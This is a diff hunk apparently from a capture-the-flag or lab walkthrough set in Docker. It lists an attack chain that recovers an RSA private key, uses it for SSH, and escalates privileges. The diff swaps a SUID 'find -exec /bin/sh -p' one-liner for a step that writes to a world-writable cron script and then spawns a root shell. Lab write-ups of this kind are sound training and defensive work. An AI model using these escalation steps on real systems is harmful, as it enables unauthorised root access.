@@ -203,7 +203,7 @@ Decrypt:
     yields: svc_admin RSA private key
 
 SSH: ssh -i id_rsa svc_admin@localhost -p 2222   [docker-compose up]
-SUID privesc: find . -exec /bin/sh -p \; -quit   [Docker container]
+Cron privesc: append to /opt/cerodias/maintenance.sh (777) → wait 60s → /bin/bash -p  [Docker]
 ```
 
 ### Parallel path (j.harris route to same DM)
